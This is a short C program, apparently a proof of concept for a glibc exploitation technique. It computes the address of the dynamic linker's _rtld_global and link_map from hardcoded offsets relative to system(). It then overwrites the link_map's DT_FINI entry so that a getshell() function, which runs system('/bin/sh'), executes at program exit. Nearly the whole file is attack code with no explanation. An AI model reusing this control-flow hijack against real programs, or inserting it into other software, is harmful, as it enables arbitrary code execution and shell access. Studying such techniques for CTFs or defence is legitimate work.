#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}

int main() {
  char *system_ptr = (char *)&system;
  char *getshell_ptr = (char *)getshell;
  printf("system:%p\n",system_ptr);
  char *_rtld_global_addr = (char *)(system_ptr+0x1a5568);
  char *_rtld_global=*(unsigned long long *)_rtld_global_addr;
  char *link_map = _rtld_global + 0x12a0;
  printf("link map %p\n",link_map);
  char *l_info_DT_FINI=link_map+0xa8;
  printf("l_info_DT_FINI  %p\n",l_info_DT_FINI);
  *(unsigned long long*)l_info_DT_FINI=0x3e4f+getshell_ptr-8;
  return 0;
}